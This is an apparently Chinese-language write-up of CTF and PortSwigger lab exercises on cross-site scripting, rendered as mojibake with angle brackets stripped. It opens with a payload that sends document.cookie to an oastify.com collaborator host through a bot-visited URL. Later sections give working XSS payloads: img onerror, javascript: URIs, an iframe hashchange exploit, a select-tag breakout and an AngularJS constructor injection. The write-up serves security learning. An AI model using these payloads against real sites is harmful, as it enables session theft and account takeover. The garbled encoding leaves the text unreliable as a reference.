è¯¥é¢˜æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæœ€å¼€å§‹æˆ‘åªåœ¨ç¬¬ä¸€è¡Œé‡Œé¢æ„é€ xssï¼Œpayloadå¦‚ä¸‹ï¼š scriptwindow.location.href=`https://pxq8pofmxik8gq7hg445ctw5jwpnde13.oastify.com/?$document.cookie`/script æäº¤ä¹‹åç¡®å®ä¼šè®¿é—®è¯¥ç½‘ç«™ä½†æ˜¯æŸ¥bpçš„æ—¶å€™å‘ç°æ²¡æœ‰ä»»ä½•çš„cookieï¼Œåé¢å†çœ‹çœ¼é¡µé¢å‘ç°éœ€è¦åˆ©ç”¨ç¬¬äºŒè¡Œå‘é€ä¸€ä¸ªurlç»™Botï¼Œæ‰€ä»¥å¦‚ä¸‹ï¼š http://challenge-fe994fbb8a6a0602.sandbox.ctfhub.com:10800/?name=scriptwindow.location.href=`https://pxq8pofmxik8gq7hg445ctw5jwpnde13.oastify.com/?$document.cookie`/script å‘é€ååœ¨bpæŸ¥çœ‹è·å–flag è¿‡æ»¤ç©ºæ ¼åªè¦ç©ºæ ¼å˜ä¸º /**/å°±å¥½å•¦ bpå®éªŒå®¤Lab: DOM XSS in innerHTML sink using source location.searchæœ¬å®éªŒåœ¨æœç´¢åšå®¢åŠŸèƒ½ä¸­åŒ…å«ä¸€ä¸ªåŸºäº DOM çš„è·¨ç«™ç‚¹è„šæœ¬æ¼æ´ã€‚å®ƒä½¿ç”¨èµ‹ innerHTML å€¼ï¼Œè¯¥èµ‹å€¼ä½¿ç”¨æ¥è‡ª location.search çš„æ•°æ®æ›´æ”¹ div å…ƒç´ çš„ HTML å†…å®¹ æœ€å¼€å§‹åœ¨æœç´¢æ¡†ä¸­è¾“å…¥ scriptalert(1)/scriptçš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰æˆåŠŸæ‰§è¡Œï¼Œé€šè¿‡hackbaræŸ¥çœ‹å…ƒç´ çš„æ—¶å€™å‘ç°è¯¥è¡Œä»£ç æˆåŠŸæ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰æ‰§è¡Œï¼ˆåé¢çœ‹è§£æè§†é¢‘çš„æ—¶å€™è¯´æ˜¯å› ä¸ºåŒæ­¥çš„é—®é¢˜ï¼Œæµè§ˆå™¨çš„è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶ï¼‰ äºæ˜¯æˆ‘ä»¬å†æ€è€ƒæ€è€ƒæœ‰ä»€ä¹ˆæ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„ï¼Œå³imgå…ƒç´ ï¼Œæˆ‘ä»¬è¿ç”¨çš„ä¹Ÿä»…ä»…æ˜¯ä¸€ä¸ªæŠ¥é”™ç½¢äº†ï¼Œæ‰€ä»¥å°è¯•åœ¨è¾“å…¥æ¡†å†…è¾“å…¥ img src=1 onerror=alert(1)ï¼Œç‚¹å‡»å‘é€ï¼Œé¡µé¢æˆåŠŸå›æ˜¾alertï¼Œäºæ˜¯é€šè¿‡è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰§è¡Œä»»æ„çš„jsä»£ç æ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ Lab: DOM XSS in jQuery anchor href attribute sink using location.search sourceè¯¥é¢˜å…ˆæ˜¯å°è¯•äº†åœ¨è¯„è®ºåŒºé‡Œé¢è¯„è®ºä»¥åŠæäº¤åé¦ˆå¤„xssï¼Œä½†æ˜¯éƒ½å¤±è´¥äº†ï¼Œåé¢æŸ¥çœ‹äº†ä¸€ä¸‹æäº¤åé¦ˆç•Œé¢çš„æºç ï¼Œå‘ç°äº†ä»¥ä¸‹ä»£ç ï¼š script\t$(function() $(#backLink).attr(href, (new URLSearchParams(window.location.search)).get(returnPath));\t);/script $(function() ... ): è¿™æ˜¯jQueryä¸­çš„ä¸€ç§æ–‡æ¡£å°±ç»ªå‡½æ•°ï¼Œå³åœ¨DOMåŠ è½½å®Œæˆåæ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚å®ƒç­‰ä»·äºJavaScriptä¸­çš„document.addEventListener(DOMContentLoaded, function() ... )ã€‚ $(#backLink): è¿™æ˜¯jQueryé€‰æ‹©å™¨ï¼Œç”¨äºé€‰å–idä¸ºâ€backLinkâ€çš„å…ƒç´ ã€‚ .attr(href, ...): è¿™æ˜¯jQueryä¸­ç”¨äºè®¾ç½®å…ƒç´ å±æ€§çš„æ–¹æ³•ã€‚åœ¨è¿™é‡Œï¼Œå®ƒè®¾ç½®äº†idä¸ºâ€backLinkâ€çš„å…ƒç´ çš„hrefå±æ€§ã€‚ (new URLSearchParams(window.location.search)).get(returnPath): è¿™ä¸€éƒ¨åˆ†ä½¿ç”¨äº†JavaScriptä¸­çš„URLSearchParamså¯¹è±¡æ¥è·å–å½“å‰é¡µé¢URLä¸­æŸ¥è¯¢å‚æ•°â€returnPathâ€çš„å€¼ã€‚é¦–å…ˆï¼Œé€šè¿‡window.location.searchè·å–å½“å‰é¡µé¢URLçš„æŸ¥è¯¢å‚æ•°éƒ¨åˆ†ï¼Œç„¶åä½¿ç”¨URLSearchParamså¯¹è±¡æ¥è§£æè¿™ä¸ªæŸ¥è¯¢å‚æ•°å­—ç¬¦ä¸²ï¼Œæœ€åè°ƒç”¨.get(returnPath)æ–¹æ³•è·å–åä¸ºâ€returnPathâ€çš„å‚æ•°çš„å€¼ã€‚ çœ‹åˆ°ç½‘å€å¤„ï¼šhttps://0aa3002e043a24f88b20e4c8006c0026.web-security-academy.net/feedback?returnPath=/å°è¯•æ€§åœ¨åé¢è¾“å…¥ abc123ï¼Œæ£€æŸ¥backæŒ‰é”®å‘ç°è¾“å…¥å†…å®¹å·²ç»è¿›å…¥äº†hrefåé¢ï¼Œå¦‚ä¸‹ï¼š äºæ˜¯æˆ‘ä»¬æŠŠè¾“å…¥çš„å†…å®¹æ”¹ä¸ºï¼šjavascript:alert(document.cookie)ï¼Œç„¶åå†ç‚¹å‡»backæŒ‰é”®ï¼Œè§£å†³é—®é¢˜ Lab: DOM XSS in jQuery selector sink using a hashchange eventè¦æ±‚ï¼šè¦è§£å†³è¯¥å®éªŒå®¤é—®é¢˜ï¼Œè¯·å‘å—å®³è€…æä¾›ä¸€ä¸ªæ¼æ´åˆ©ç”¨ç¨‹åºï¼Œåœ¨å…¶æµè§ˆå™¨ä¸­è°ƒç”¨ print() å‡½æ•° è¿›å…¥å®éªŒå®¤ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œjsä»£ç å¦‚ä¸‹ï¼š $(window).on(hashchange, function()\tvar post = $(section.blog-list h2:contains( + decodeURIComponent(window.location.hash.slice(1)) + ));\tif (post) post.get(0).scrollIntoView();); è¿™æ®µä»£ç æ˜¯ç”¨jQueryç¼–å†™çš„ï¼Œç›‘å¬æµè§ˆå™¨URLä¸­å“ˆå¸Œå€¼ï¼ˆ#åé¢çš„éƒ¨åˆ†ï¼‰çš„å˜åŒ–ï¼Œå½“å“ˆå¸Œå€¼å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå®ƒä¼šæŸ¥æ‰¾é¡µé¢ä¸Šå¸¦æœ‰ç‰¹å®šæ ‡é¢˜çš„å…ƒç´ ï¼Œå¹¶å°†é¡µé¢æ»šåŠ¨åˆ°è¯¥å…ƒç´ ä½ç½®ã€‚ å…·ä½“æ¥è¯´ï¼š $(window).on(hashchange, function()...);ï¼šè¿™ä¸€è¡Œä»£ç æ˜¯å½“æµè§ˆå™¨URLçš„å“ˆå¸Œå€¼å‘ç”Ÿå˜åŒ–æ—¶è§¦å‘çš„äº‹ä»¶å¤„ç†ç¨‹åºã€‚ var post = $(section.blog-list h2:contains( + decodeURIComponent(window.location.hash.slice(1)) + ));ï¼šè¿™ä¸€è¡Œä»£ç æ˜¯æŸ¥æ‰¾é¡µé¢ä¸ŠåŒ…å«ç‰¹å®šæ ‡é¢˜çš„å…ƒç´ ã€‚å®ƒé¦–å…ˆè§£ç å“ˆå¸Œå€¼ï¼ˆç”±decodeURIComponent()å‡½æ•°å®Œæˆï¼‰ï¼Œç„¶åä½¿ç”¨é€‰æ‹©å™¨section.blog-list h2:contains(...)æŸ¥æ‰¾å¸¦æœ‰æŒ‡å®šæ ‡é¢˜çš„h2å…ƒç´ ã€‚æŸ¥æ‰¾ç»“æœå°†è¢«å­˜å‚¨åœ¨å˜é‡postä¸­ã€‚ if (post) post.get(0).scrollIntoView();ï¼šè¿™ä¸€è¡Œä»£ç æ˜¯å°†é¡µé¢æ»šåŠ¨åˆ°åŒ…å«ç‰¹å®šæ ‡é¢˜çš„å…ƒç´ å¤„ã€‚å®ƒé¦–å…ˆæ£€æŸ¥æ˜¯å¦æ‰¾åˆ°äº†ç¬¦åˆæ¡ä»¶çš„å…ƒç´ ï¼ˆé€šè¿‡æ£€æŸ¥postå˜é‡æ˜¯å¦å­˜åœ¨ï¼‰ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ™ä½¿ç”¨scrollIntoView()æ–¹æ³•å°†å…¶æ»šåŠ¨åˆ°å¯è§åŒºåŸŸã€‚ è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯è®©é¡µé¢åœ¨åŠ è½½åæ ¹æ®URLä¸­çš„å“ˆå¸Œå€¼è‡ªåŠ¨æ»šåŠ¨åˆ°å¯¹åº”æ ‡é¢˜çš„éƒ¨åˆ† é¡µé¢æºç ä¸­çš„h2å…ƒç´ å°±æ˜¯æ–‡ç« çš„æ ‡é¢˜ ç½‘ä¸Šæ‰¾åˆ°çš„å…³äºæ­¤å‡½æ•°çš„ç›¸å…³æ¼æ´é“¾æ¥ï¼šhttps://bugs.jquery.com/ticket/9521/ å‘ç°äº†æœ‰æ„æ€çš„åœ°æ–¹å¦‚ä¸‹ï¼š $(location.hash) expected CSS selector in many case, but this code also can create html element.â€œ$(location.hash)â€åœ¨å¾ˆå¤šæƒ…å†µä¸‹éƒ½éœ€è¦ CSS é€‰æ‹©å™¨ï¼Œä½†æ­¤ä»£ç ä¹Ÿå¯ä»¥åˆ›å»º html å…ƒç´ ã€‚ ä¸Šé¢çš„æ„æ€å°±æ˜¯è¯´å¦‚æœæœªæ‰¾åˆ°cssé€‰æ‹©å™¨ä¸­è¦æŸ¥æ‰¾çš„å…ƒç´ ï¼Œé‚£ä¹ˆä¼šè‡ªåŠ¨åˆ›å»ºhtmlå…ƒç´  è¿™æ ·å­çš„è¯æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨#åé¢åŠ ä¸Šjsä»£ç ï¼šhttps://0a3200c703b1b8bf81aed57300fd0044.web-security-academy.net/#img src=x onerror=print()ï¼Œç‚¹å‡»å›è½¦ä¼šæœ‰å¼¹çª—å‡ºç°ï¼Œä½†æ˜¯åªèƒ½å¤Ÿè§¦å‘ä¸€æ¬¡ï¼Œä¸‹ä¸€æ¬¡å°±å¤±è´¥ï¼Œæ— æ³•è®¿é—®ç½‘ç«™ï¼Œæ‰€ä»¥ç›´æ¥æŠŠè¯¥é“¾æ¥ç»™å—å®³è€…çš„åŠæ³•æ˜¯è¡Œä¸é€šçš„ï¼Œéœ€è¦æ¢ä¸€ç§æ€è·¯ï¼šé¦–å…ˆåŠ è½½https://0a3200c703b1b8bf81aed57300fd0044.web-security-academy.net/#ï¼Œç„¶åæˆ‘ä»¬å†æŠŠpayloadåŠ è½½åˆ°è¯¥urlä¸­ï¼Œè¿™æ ·ä¾¿å¯ä»¥è§¦å‘ä¸€æ¬¡å“ˆå¸Œæ›´æ”¹äº‹ä»¶ æ‰€ä»¥æˆ‘ä»¬åœ¨bpæä¾›çš„æ¼æ´åˆ©ç”¨ç¨‹åºä¸­çš„bodyéƒ¨åˆ†å¯ä»¥è¿™æ ·å†™åˆ°ï¼š iframe src=https://YOUR-LAB-ID.web-security-academy.net/# onload=this.src+=img src=x onerror=print()/iframe æµ‹è¯•è¯¥æ¼æ´æˆåŠŸï¼ŒæŠŠå®ƒå‘ç»™å—å®³è€…ï¼Œé¢˜ç›®è§£å†³ Labï¼šå°† XSS åå°„åˆ°å¸¦æœ‰å°–æ‹¬å· HTML ç¼–ç çš„å±æ€§ä¸­è¦æ±‚ï¼šæ­¤å®éªŒå®¤åœ¨æœç´¢åšå®¢åŠŸèƒ½ä¸­åŒ…å«ä¸€ä¸ªåæ˜ çš„è·¨ç«™ç‚¹è„šæœ¬æ¼æ´ï¼Œå…¶ä¸­å°–æ‹¬å·æ˜¯ HTML ç¼–ç çš„ã€‚è¦å®Œæˆæ­¤å®éªŒï¼Œè¯·æ‰§è¡Œè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼Œæ³¨å…¥å±æ€§å¹¶è°ƒç”¨ alert å‡½æ•° åœ¨æœç´¢æ¡†å¤„éšæœºè¾“å…¥ä¸€ä¸²å­—ç¬¦ï¼Œç„¶åæ£€æŸ¥å…ƒç´ ï¼Œå¦‚ä¸‹ï¼š input type=text placeholder=Search the blog... name=search value=ilbxoiusagxui äºæ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•é€ƒå‡ºåŒå¼•å·ï¼Œé¦–å…ˆå°è¯•è¾“å…¥ï¼šscriptalert(1)/scriptï¼Œå¤±è´¥ï¼Œæ£€æŸ¥å…ƒç´ ï¼Œå‘ç°ç‰¹æ®Šç¬¦å·è¢«è½¬åŒ–ä¸ºHTMLå®ä½“ï¼Œ æ¥ç€å°è¯•ï¼šonload=alert(1)ï¼Œå¤±è´¥ï¼Œæ²¡æœ‰å¼¹çª— æ¥ç€å°è¯•å¦ä¸€ç§æ–¹æ³•ï¼šonmouseover=alert(1)ï¼Œé¼ æ ‡ç»è¿‡ç›¸å…³å…ƒç´ ï¼Œå¼¹çª—æˆåŠŸï¼Œé¢˜ç›®è§£å†³ Labï¼šå°† XSS å­˜å‚¨åˆ°å¸¦æœ‰åŒå¼•å· HTML ç¼–ç çš„é”šç‚¹ href å±æ€§ä¸­è¦æ±‚ï¼šè¯¥å®éªŒåœ¨è¯„è®ºåŠŸèƒ½ä¸­åŒ…å«ä¸€ä¸ªå­˜å‚¨çš„è·¨ç«™ç‚¹è„šæœ¬æ¼æ´ã€‚è¦å®Œæˆæ­¤å®éªŒï¼Œè¯·æäº¤ä¸€æ¡è¯„è®ºï¼Œè¯¥è¯„è®ºåœ¨å•å‡»è¯„è®ºä½œè€…å§“åæ—¶è°ƒç”¨ alert å‡½æ•° éšä¾¿ç‚¹è¿›ä¸€ç¯‡æ–‡ç« ï¼Œå…ˆéšä¾¿æäº¤ä¸€æ¡è¯„è®ºï¼Œæ¥ç€è¿”å›æŸ¥çœ‹è¯„è®ºï¼Œå¦‚ä¸‹ï¼š ç‚¹å‡»è¯„è®ºè€…åå­—çš„è¯ä¼šè‡ªåŠ¨è·³è½¬åˆ°ä½ è¾“å…¥è¿›å»çš„ç½‘å€ æ‰€ä»¥æˆ‘ä»¬æœ‰äº†æ€è·¯ï¼Œåœ¨å†™è¯„è®ºä¸­è®©ä½ è¾“å…¥ç½‘å€çš„åœ°æ–¹åˆ©ç”¨jsä¼ªåè®®ï¼Œè¾“å…¥ï¼šjavascript:alert(1)ï¼Œæäº¤è¯„è®ºï¼Œé¢˜ç›®è§£å†³ ï¼ˆurlçš„ç»„æˆæ˜¯åè®®åŠ ä¸Šåœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨jsä¼ªåè®®å¯ä»¥æˆåŠŸï¼‰ Labï¼šå°† XSS åå°„åˆ°å¸¦æœ‰å°–æ‹¬å· HTML ç¼–ç çš„ JavaScript å­—ç¬¦ä¸²ä¸­è¦æ±‚ï¼šæ­¤å®éªŒå®¤åœ¨å°–æ‹¬å·ç¼–ç çš„æœç´¢æŸ¥è¯¢è·Ÿè¸ªåŠŸèƒ½ä¸­åŒ…å«åæ˜ çš„è·¨ç«™ç‚¹è„šæœ¬æ¼æ´ã€‚åå°„å‘ç”Ÿåœ¨ JavaScript å­—ç¬¦ä¸²å†…ã€‚è¦å®Œæˆæœ¬å®éªŒï¼Œè¯·æ‰§è¡Œè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼Œçªç ´ JavaScript å­—ç¬¦ä¸²å¹¶è°ƒç”¨ alert å‡½æ•° åœ¨æœç´¢æ ä¸­æœç´¢æ–‡ç« åå­—åï¼Œå³é”®æ£€æŸ¥å…ƒç´ ï¼Œå‘ç°äº†ç›¸å…³çš„jsä»£ç å¦‚ä¸‹ï¼š scriptvar searchTerms = 125;document.write(img src=/resources/images/tracker.gif?searchTerms=+encodeURIComponent(searchTerms)+);/script æœ€å¼€å§‹çš„æ€è·¯è¢«é¢˜ç›®å¸¦æ­ªäº†ï¼Œä¸€ç›´åœ¨æ€è€ƒç€æ€ä¹ˆçªç ´ä¸‹é¢çš„åŒå¼•å·åŒ…æ‹¬ï¼Œå½“ç„¶æœ€ç»ˆçš„å°è¯•ä»¥å¤±è´¥å‘Šç»ˆ ç„¶åå°±æ²¡æœ‰æ€è·¯ï¼Œå¼€å§‹çœ‹ä¸‹é¢çš„è®²è§£è§†é¢‘ï¼Œå‘ç°ä»–æ˜¯çªç ´ä¸Šé¢å˜é‡searchTermsçš„å•å¼•å·åŒ…æ‹¬ï¼Œæç„¶å¤§æ‚Ÿ è¿›è¡Œå°è¯•ï¼š;alert(1);å°è¯•å¤±è´¥ï¼Œä½†æ˜¯æˆåŠŸé€ƒè„±äº†å•å¼•å·åŒ…æ‹¬ï¼Œè¦è§£å†³çš„å°±æ˜¯åé¢é—ç•™çš„; æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è‡ªå·±å†åˆ›é€ ä¸€ä¸ªå˜é‡å‡ºæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š;alert(1);let word= é¢˜ç›®è§£å†³ ä¸å¾—ä¸è¯´æ€è·¯å¾—æ‰©å¤§ä¸€ç‚¹ï¼Œä¸èƒ½åªå±€é™äºä¸€å¤„ï¼Œè¦å¤šçœ‹çœ‹å…¶ä»–åœ°æ–¹æœ‰æ²¡æœ‰å¯ä»¥çªç ´çš„åœ°æ–¹ Labï¼š document.write æ¥æ”¶å™¨ä¸­çš„ DOM XSS ä½¿ç”¨é€‰æ‹©å…ƒç´ å†…çš„æº location.searchè¦æ±‚ï¼šæ­¤å®éªŒå®¤åœ¨è‚¡ç¥¨æ£€æŸ¥å™¨åŠŸèƒ½ä¸­åŒ…å«åŸºäº DOM çš„è·¨ç«™ç‚¹è„šæœ¬æ¼æ´ã€‚å®ƒä½¿ç”¨ JavaScript document.write å‡½æ•°ï¼Œå°†æ•°æ®å†™å…¥é¡µé¢ã€‚ document.write å‡½æ•°ä½¿ç”¨æ¥è‡ª location.search çš„æ•°æ®è¿›è¡Œè°ƒç”¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç½‘ç«™ URL è¿›è¡Œæ§åˆ¶ã€‚æ•°æ®åŒ…å«åœ¨é€‰æ‹©å…ƒç´ å†…ã€‚è¦å®Œæˆæ­¤å®éªŒï¼Œè¯·æ‰§è¡Œè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼Œè¯¥æ”»å‡»ä¼šçªç ´ select å…ƒç´ å¹¶è°ƒç”¨ alert å‡½æ•° ç›¸å…³çš„jsä»£ç å¦‚ä¸‹ï¼š scriptvar stores = [London,Paris,Milan];var store = (new URLSearchParams(window.location.search)).get(storeId);document.write(select name=storeId);if(store) document.write(option selected+store+/option);for(var i=0;istores.length;i++) if(stores[i] === store) continue; document.write(option+stores[i]+/option);document.write(/select);/script è¿™æ®µ JavaScript ä»£ç åˆ›å»ºäº†ä¸€ä¸ª select å…ƒç´ ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ç»„å•†åº—åç§°ä½œä¸ºé€‰é¡¹ã€‚å®ƒè¿˜æ ¹æ® URL æŸ¥è¯¢å‚æ•°ä¸­çš„ storeId å€¼é€‰æ‹©äº†ä¸€ä¸ªé»˜è®¤é€‰é¡¹ã€‚ è®©æˆ‘ä»¬é€è¡Œè§£é‡Šä»£ç çš„åŠŸèƒ½ï¼š var stores = [London,Paris,Milan];ï¼šå®šä¹‰äº†ä¸€ä¸ªåŒ…å«å•†åº—åç§°çš„æ•°ç»„ã€‚ var store = (new URLSearchParams(window.location.search)).get(storeId);ï¼šä½¿ç”¨ URLSearchParams è·å–äº†å½“å‰é¡µé¢ URL æŸ¥è¯¢å‚æ•°ä¸­åä¸º storeId çš„å€¼ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ store å˜é‡ä¸­ã€‚ document.write(select name=storeId);ï¼šä½¿ç”¨ document.write() æ–¹æ³•è¾“å‡ºäº†ä¸€ä¸ª select å…ƒç´ çš„å¼€å§‹æ ‡ç­¾ã€‚ if (store) ... ï¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ storeId å‚æ•°ã€‚å¦‚æœå­˜åœ¨ï¼Œå°±åœ¨ select ä¸­æ·»åŠ ä¸€ä¸ªè¢«é€‰ä¸­çš„é€‰é¡¹ï¼Œæ˜¾ç¤ºå½“å‰çš„ storeId å€¼ã€‚ for (var i = 0; i stores.length; i++) ... ï¼šéå†å•†åº—æ•°ç»„ï¼Œå¯¹æ¯ä¸ªå•†åº—åˆ›å»ºä¸€ä¸ª option å…ƒç´ ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ° select ä¸­ã€‚ document.write(/select);ï¼šè¾“å‡º select å…ƒç´ çš„ç»“æŸæ ‡ç­¾ã€‚ é€šè¿‡è¿™æ®µä»£ç ï¼Œä½ å¯ä»¥åœ¨é¡µé¢ä¸Šåˆ›å»ºä¸€ä¸ªä¸‹æ‹‰èœå•ï¼Œå…¶ä¸­åŒ…å«äº†é¢„å®šä¹‰çš„å•†åº—é€‰é¡¹ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ® URL ä¸­çš„ storeId å‚æ•°è‡ªåŠ¨é€‰æ‹©é»˜è®¤é€‰é¡¹ äºæ˜¯æˆ‘ä»¬å°è¯•åœ¨urlä¸­æ·»åŠ å‚æ•°ï¼šhttps://0a9a006303a2363184429b37009500d5.web-security-academy.net/product?productId=1storeId=sherlockï¼Œç„¶åå›è½¦ï¼Œæ£€æŸ¥å…ƒç´ ï¼Œå˜åŒ–å¦‚ä¸‹ï¼š select name=storeId\toption selected=sherlock/option\toptionLondon/option\toptionParis/option\toptionMilan/option/select é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬è¯´è¦çªç ´selectæ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®©å®ƒæå‰é—­åˆï¼Œpayloadå¦‚ä¸‹ï¼š storeId=sherlock/selectimg src=1 onerror=alert(1)åé¢æœªé—­åˆçš„æ ‡ç­¾æˆ‘ä»¬ä¸éœ€è¦å»ç®¡ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä¿®å¤ï¼Œå›è½¦åå¦‚ä¸‹ select name=storeId\toption selected=sherlock/option/selectimg src=1 onerror=alert(1)optionLondon/optionoptionParis/optionoptionMilan/option é¢˜ç›®è§£å†³ Labï¼šAngularJS è¡¨è¾¾å¼ä¸­çš„ DOM XSSï¼Œå¸¦æœ‰å°–æ‹¬å·å’ŒåŒå¼•å· HTML ç¼–ç è¯¥å®éªŒåœ¨æœç´¢åŠŸèƒ½ä¸­çš„ AngularJS è¡¨è¾¾å¼ä¸­åŒ…å«åŸºäº DOM çš„è·¨ç«™ç‚¹è„šæœ¬æ¼æ´ã€‚AngularJS æ˜¯ä¸€ä¸ªæµè¡Œçš„ JavaScript åº“ï¼Œå®ƒæ‰«æåŒ…å« ng-app å±æ€§ï¼ˆä¹Ÿç§°ä¸º AngularJS æŒ‡ä»¤ï¼‰çš„ HTML èŠ‚ç‚¹çš„å†…å®¹ã€‚å½“æŒ‡ä»¤æ·»åŠ åˆ° HTML ä»£ç ä¸­æ—¶ï¼Œæ‚¨å¯ä»¥æ‰§è¡ŒåŒèŠ±æ‹¬å·å†…çš„ JavaScript è¡¨è¾¾å¼ã€‚å½“å¯¹å°–æ‹¬å·è¿›è¡Œç¼–ç æ—¶ï¼Œæ­¤æŠ€æœ¯éå¸¸æœ‰ç”¨ã€‚è¦å®Œæˆæ­¤å®éªŒï¼Œè¯·æ‰§è¡Œè·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼Œè¯¥æ”»å‡»æ‰§è¡Œ AngularJS è¡¨è¾¾å¼å¹¶è°ƒç”¨ alert å‡½æ•° æ ¹æ®é¢˜ç›®æä¾›çš„ç›¸å…³æè¿°ï¼Œåœ¨è°·æ­Œä¸Šé¢è¿›è¡Œæœç´¢ï¼Œå¾—åˆ°äº†ä¸€ç¯‡ç›¸å…³çš„éå¸¸æœ‰ç”¨çš„æ–‡ç« ï¼šhttps://nosec.org/home/detail/4153.html ç”±äºå°–æ‹¬å·è¢«ç¼–ç äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ç›¸å…³ç‰¹æ®Šå­—ç¬¦ï¼Œä¾¿å°è¯•ç”¨åŒèŠ±æ‹¬å· é¦–å…ˆè¾“å…¥1+1ï¼šè¾“å‡ºä¸º2ï¼Œè¡¨æ˜åº”ç”¨å¾ˆå®¹æ˜“å—åˆ°å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥çš„å½±å“ é»˜è®¤æƒ…å†µä¸‹ï¼Œä½œç”¨åŸŸå¯¹è±¡åŒ…å«å¦ä¸€ä¸ªåä¸ºâ€œæ„é€ å™¨â€çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡åŒ…å«ä¸€ä¸ªä¹Ÿè¢«ç§°ä¸ºâ€œæ„é€ å™¨â€çš„å‡½æ•°ã€‚æ­¤å‡½æ•°å¯ç”¨äºåŠ¨æ€ç”Ÿæˆå’Œæ‰§è¡Œä»£ç ã€‚è€Œè¿™æ­£æ˜¯æˆ‘ä»¬æ‰§è¡ŒXSSçš„payloadæ‰€éœ€è¦çš„ æ‰€ä»¥æ„é€ payloadä¸ºï¼šconstructor.constructor('alert(1)')() é¢˜ç›®è§£å†³ Labï¼šåå°„å‹ DOM XSSæœ¬å®éªŒæ¼”ç¤ºäº†åå°„ DOM æ¼æ´ã€‚å½“æœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºå¤„ç†è¯·æ±‚ä¸­çš„æ•°æ®å¹¶åœ¨å“åº”ä¸­å›æ˜¾æ•°æ®æ—¶ï¼Œå°±ä¼šå‡ºç°åå°„ DOM æ¼æ´ã€‚ç„¶åï¼Œé¡µé¢ä¸Šçš„è„šæœ¬ä»¥ä¸å®‰å…¨çš„æ–¹å¼å¤„ç†åå°„çš„æ•°æ®ï¼Œæœ€ç»ˆå°†å…¶å†™å…¥å±é™©çš„æ¥æ”¶å™¨ã€‚è¦å®Œæˆæœ¬å®éªŒï¼Œè¯·åˆ›å»ºä¸€ä¸ªè°ƒç”¨ alert() å‡½æ•°çš„æ³¨å…¥ å…ˆæ‰“å¼€burpsuiteï¼Œè¿›å…¥å®éªŒå®¤åæ‰“å¼€proxyï¼Œç„¶ååœ¨æœç´¢æ¡†ä¸­éšä¾¿è¾“å…¥å­—ç¬¦ä¸²ï¼ˆæ¯”å¦‚xssï¼‰ï¼Œåˆ°bpçš„ä»£ç†çš„urlå†å²ä¸­æ‰¾åˆ°/search-results?search=xssï¼ŒæŠŠå®ƒå‘é€åˆ°repeaterä¸­ï¼Œè¯¥æ¡ç›®å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š æˆ‘ä»¬å¯ä»¥å°è¯•çªç ´åŒå¼•å·åŒ…æ‹¬ï¼Œå³xss-alert(1)//ï¼Œå‘ç°è¡Œä¸é€šï¼ŒåŒå¼•å·ä¼šè‡ªåŠ¨è¢«è½¬ä¹‰ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå·±å…ˆç»™å®ƒåŠ ä¸ªè½¬ä¹‰ï¼Œè€Œè½¬ä¹‰ç¬¦ä¹Ÿæ˜¯å¯ä»¥è¢«è½¬ä¹‰çš„ï¼Œè¿™æ ·å­æˆ‘ä»¬å°±å¯ä»¥çªç ´åŒå¼•å·äº†ï¼Œpayloadä¸ºï¼šxss\\-alert(1)//ï¼Œå¦‚ä¸‹ï¼š æˆåŠŸé€ƒè„±ï¼Œå¼¹çª—æˆåŠŸï¼Œé¢˜ç›®è§£å†³ payloadä¸­-çš„ä½œç”¨ï¼š- åé¢çš„å†…å®¹ alert(1) æ˜¯ä¸€ä¸ª JavaScript ä»£ç ç‰‡æ®µï¼Œå®ƒå°è¯•æ‰§è¡Œä¸€ä¸ªå¼¹çª—è­¦å‘Šæ¡†ã€‚ç„¶è€Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™æ®µä»£ç è¢«åŒ…å«åœ¨åŒå¼•å· ä¸­ï¼Œå¹¶ä¸”åœ¨å¤–é¢åŒ…è£¹äº†åæ–œæ  \\ã€‚è¿™æ ·åšæ˜¯ä¸ºäº†é¿å… JSON æ ¼å¼å‡ºé”™ï¼Œå› ä¸ºåŒå¼•å·å’Œåæ–œæ éƒ½æ˜¯ JSON å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚ æ€»ä¹‹ï¼Œ- çš„ä½œç”¨æ˜¯å¯¹æœç´¢æ¡ä»¶è¿›è¡Œé€»è¾‘æ“ä½œï¼Œè€Œè¿™ä¸ªæœç´¢æ¡ä»¶ä¸­åŒ…å«äº†ä¸€ä¸ªè¢«æ’é™¤çš„ JavaScript ä»£ç ç‰‡æ®µ 